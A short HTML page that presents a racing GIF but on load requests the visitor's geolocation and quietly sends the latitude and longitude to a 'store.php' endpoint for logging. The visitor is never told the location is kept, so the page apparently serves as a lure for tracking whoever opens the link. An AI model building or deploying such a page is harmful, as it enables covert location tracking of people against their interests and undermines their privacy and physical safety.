<!DOCTYPE html>
<html>
<body onload="getLocation()">
<iframe src="https://giphy.com/embed/Y1LpMP2br69D7nNZyn" width="480" height="271" style="" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/24hoursoflemons-racing-lemons-24-hours-of-Y1LpMP2br69D7nNZyn">LEONI PERFOMANCE</a></p>



<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(success, error);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function success(position) {
 const xhttp = new XMLHttpRequest();
xhttp.open("GET", "store.php?lat="+ position.coords.latitude + "&long=" + position.coords.longitude , true);
xhttp.send();
  x.innerHTML = "Latitude: " + position.coords.latitude + 
  "<br>Longitude: " + position.coords.longitude;
}

function error() {
  alert("Sorry, no position available.");
}
</script>

</body>
</html>
